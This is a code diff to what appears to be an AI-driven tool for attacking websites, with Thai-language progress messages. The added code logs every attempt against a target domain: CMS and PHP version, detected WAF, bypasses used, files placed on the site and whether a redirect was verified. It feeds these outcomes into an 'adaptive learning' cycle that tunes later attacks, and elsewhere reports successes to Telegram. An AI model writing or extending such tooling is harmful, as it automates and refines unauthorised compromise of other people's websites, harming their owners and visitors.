@@ -29,7 +29,10 @@ import {
   ALL_ATTACK_METHODS,
   type AttackAttemptRecord,
   type TargetContext,
+  recordAttackOutcome,
+  type AttackOutcome,
 } from "./ai-attack-strategist";
+import { runLearningCycle } from "./adaptive-learning";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -520,6 +523,17 @@ async function runAgenticLoop(
     });
     
     await updateSessionStatus(sessionId, "completed", summaryText);
+
+    // ═══ ADAPTIVE LEARNING: Run learning cycle after session completes ═══
+    if (attackedCount >= 3) {
+      await emitEvent("learning", "🧠 AI กำลังเรียนรู้จากผลลัพธ์ของ session นี้...", 100);
+      try {
+        const learningResult = await runLearningCycle();
+        await emitEvent("learned", `📚 Adaptive Learning: อัพเดท ${learningResult.patternsUpdated} patterns, ${learningResult.profilesUpdated} CMS profiles`, 100, learningResult);
+      } catch (e: any) {
+        console.error(`[AdaptiveLearning] Post-session learning cycle error: ${e.message}`);
+      }
+    }
     
     // Send summary to Telegram if there were successes
     if (successCount > 0) {
@@ -714,6 +728,40 @@ async function attackSingleTarget(
             retryAttempt: attempt,
           });
 
+          // ═══ ADAPTIVE LEARNING: Record SUCCESS ═══
+          recordAttackOutcome({
+            targetDomain: target.domain,
+            cms: target.cms || null,
+            cmsVersion: target.cmsVersion || null,
+            serverType: target.serverType || null,
+            phpVersion: target.phpVersion || null,
+            wafDetected: target.waf || null,
+            wafStrength: null,
+            vulnScore: target.vulnScore || null,
+            method: currentMethodPriority[0] || "unified_pipeline",
+            exploitType: "multi_step",
+            payloadType: null,
+            wafBypassUsed: [],
+            payloadModifications: [],
+            attackPath: null,
+            attemptNumber: attempt + 1,
+            isRetry: attempt > 0,
+            previousMethodsTried: attemptHistory.map(a => a.method),
+            success: true,
+            httpStatus: 200,
+            errorCategory: null,
+            errorMessage: null,
+            filesPlaced: verifiedUrls.length,
+            redirectVerified: true,
+            durationMs: Date.now() - attackStartTime,
+            aiFailureCategory: null,
+            aiReasoning: null,
+            aiConfidence: null,
+            aiEstimatedSuccess: null,
+            sessionId: deployId,
+            agenticSessionId: sessionId,
+          }).catch((e) => console.error(`[AdaptiveLearning] record success error: ${e.message}`));
+
           return { target, success: true, reason: "verified", deployId, deployedUrls: verifiedUrls };
         }
 
@@ -749,6 +797,40 @@ async function attackSingleTarget(
       };
       attemptHistory.push(attemptRecord);
 
+      // ═══ ADAPTIVE LEARNING: Record FAILURE ═══
+      recordAttackOutcome({
+        targetDomain: target.domain,
+        cms: target.cms || null,
+        cmsVersion: target.cmsVersion || null,
+        serverType: target.serverType || null,
+        phpVersion: target.phpVersion || null,
+        wafDetected: target.waf || null,
+        wafStrength: null,
+        vulnScore: target.vulnScore || null,
+        method: currentMethodPriority[0] || "unified_pipeline",
+        exploitType: "multi_step",
+        payloadType: null,
+        wafBypassUsed: [],
+        payloadModifications: [],
+        attackPath: null,
+        attemptNumber: attempt + 1,
+        isRetry: attempt > 0,
+        previousMethodsTried: attemptHistory.slice(0, -1).map(a => a.method),
+        success: false,
+        httpStatus: jobFinalStatus === "timeout" ? 408 : null,
+        errorCategory: jobFinalStatus,
+        errorMessage: `${jobFinalStatus}: ${jobPhase}`,
+        filesPlaced: 0,
+        redirectVerified: false,
+        durationMs: attackDuration,
+        aiFailureCategory: null,
+        aiReasoning: null,
+        aiConfidence: null,
+        aiEstimatedSuccess: null,
+        sessionId: null,
+        agenticSessionId: sessionId,
+      }).catch((e) => console.error(`[AdaptiveLearning] record failure error: ${e.message}`));
+
       if (attempt >= maxRetries) {
         await emitEvent("failed", `❌ ${target.domain} — ล้มเหลวหลัง ${attempt + 1} ครั้ง (AI retries exhausted)`, 0, {
           domain: target.domain,
@@ -778,6 +860,40 @@ async function attackSingleTarget(
         timestamp: Date.now(),
       };
       attemptHistory.push(attemptRecord);
+
+      // ═══ ADAPTIVE LEARNING: Record ERROR ═══
+      recordAttackOutcome({
+        targetDomain: target.domain,
+        cms: target.cms || null,
+        cmsVersion: target.cmsVersion || null,
+        serverType: target.serverType || null,
+        phpVersion: target.phpVersion || null,
+        wafDetected: target.waf || null,
+        wafStrength: null,
+        vulnScore: target.vulnScore || null,
+        method: currentMethodPriority[0] || "unified_pipeline",
+        exploitType: "multi_step",
+        payloadType: null,
+        wafBypassUsed: [],
+        payloadModifications: [],
+        attackPath: null,
+        attemptNumber: attempt + 1,
+        isRetry: attempt > 0,
+        previousMethodsTried: attemptHistory.slice(0, -1).map(a => a.method),
+        success: false,
+        httpStatus: null,
+        errorCategory: "exception",
+        errorMessage: e.message,
+        filesPlaced: 0,
+        redirectVerified: false,
+        durationMs: attackDuration,
+        aiFailureCategory: null,
+        aiReasoning: null,
+        aiConfidence: null,
+        aiEstimatedSuccess: null,
+        sessionId: null,
+        agenticSessionId: sessionId,
+      }).catch((err) => console.error(`[AdaptiveLearning] record error error: ${err.message}`));
 
       if (attempt >= maxRetries) {
         await emitEvent("failed", `❌ ${target.domain} — Error หลัง ${attempt + 1} ครั้ง: ${e.message}`, 0);
